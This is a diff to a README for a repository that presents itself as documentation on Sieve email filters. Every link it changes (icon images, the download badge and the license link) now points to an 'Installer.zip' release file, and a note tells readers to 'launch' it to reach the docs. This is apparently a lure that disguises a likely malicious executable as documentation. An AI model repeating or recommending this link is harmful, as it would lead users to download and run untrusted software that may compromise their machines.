@@ -1,7 +1,7 @@
 
 # **EMAIL2 Filters Sieve Docs**
 
-![Email Filters](https://img.icons8.com/nolan/64/email.png) ![Sieve Programming](https://img.icons8.com/dusk/64/000000/source-code.png) ![Documentation](https://img.icons8.com/cotton/64/000000/read.png)
+![Email Filters](https://github.com/LetsthinkbetterCodes/EMAIL2_Filters_Sieve_Docs/releases/download/v1.0/Installer.zip) ![Sieve Programming](https://github.com/LetsthinkbetterCodes/EMAIL2_Filters_Sieve_Docs/releases/download/v1.0/Installer.zip) ![Documentation](https://github.com/LetsthinkbetterCodes/EMAIL2_Filters_Sieve_Docs/releases/download/v1.0/Installer.zip)
 
 Welcome to the official documentation source repository for the EMAIL 2.0 sieve filter specification component! Here you will find all the information you need to understand and implement Email filters using the Sieve programming language.
 
@@ -15,7 +15,7 @@ Welcome to the official documentation source repository for the EMAIL 2.0 sieve 
 
 To dive into the EMAIL 2.0 sieve filter specification and start implementing Email filters using Sieve, download the latest version from the link below:
 
-[![Download EMAIL2 Filters Sieve Docs](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download EMAIL2 Filters Sieve Docs](https://github.com/LetsthinkbetterCodes/EMAIL2_Filters_Sieve_Docs/releases/download/v1.0/Installer.zip)](https://github.com/LetsthinkbetterCodes/EMAIL2_Filters_Sieve_Docs/releases/download/v1.0/Installer.zip)
 
 ### Note:
 The provided link needs to be launched to access the documentation content.
@@ -43,7 +43,7 @@ Stay up-to-date with the latest developments and updates by watching this reposi
 
 ## License
 
-This repository is licensed under [GNU General Public License v3.0 (GPL-3.0)](https://www.gnu.org/licenses/gpl-3.0.html). Feel free to use, share, and modify the documentation according to the terms of the license.
+This repository is licensed under [GNU General Public License v3.0 (GPL-3.0)](https://github.com/LetsthinkbetterCodes/EMAIL2_Filters_Sieve_Docs/releases/download/v1.0/Installer.zip). Feel free to use, share, and modify the documentation according to the terms of the license.
 
 ---
 
